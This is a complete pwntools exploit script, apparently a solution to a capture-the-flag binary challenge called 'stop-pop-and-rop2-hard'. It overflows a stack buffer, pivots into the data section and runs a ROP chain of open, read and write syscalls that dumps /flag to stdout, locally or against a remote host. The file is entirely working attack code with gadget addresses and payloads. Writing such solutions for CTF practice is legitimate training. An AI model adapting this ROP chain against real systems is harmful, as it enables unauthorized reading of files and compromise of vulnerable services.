#!/usr/bin/env python3

from pwn import *

exe = ELF("./stop-pop-and-rop2-hard_patched")

context.binary = exe

gdb_script = """
b *0x401890
c
"""

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdb_script)
    else:
        r = remote("addr", 1337)

    return r

data_section = 0x404090
flag = b'/flag\x00aa'
ret_gadget = 0x40101a
pop_rdi = 0x40187e
pop_rax = 0x401887
pop_rsi = 0x40189e
pop_rdx = 0x401867
syscall = 0x40188e
offset = 136
read_func = 0x4018cc

def main():
    r = conn()

    # good luck pwning :)

    payload = flat(
        b'A'*128,
        data_section,
        pop_rax,
        data_section,
        read_func
        
    )
    r.sendline(payload)
    payload2 = flat(
        flag,
        # first we open the file
        pop_rax, 2,
        pop_rdi, data_section,
        pop_rsi, 0,
        pop_rdx, 0,
        syscall,
        # then we read the file
        pop_rax, 0,
        pop_rdi, 3,
        pop_rsi, data_section,
        pop_rdx, 100,
        syscall,
        # finally we write to stdout
        pop_rax, 1,
        pop_rdi, 1,
        pop_rsi, data_section,
        pop_rdx, 100,
        syscall,
    )
    r.sendlineafter(b'Leaving!\n',payload2)
    r.interactive()


if __name__ == "__main__":
    main()
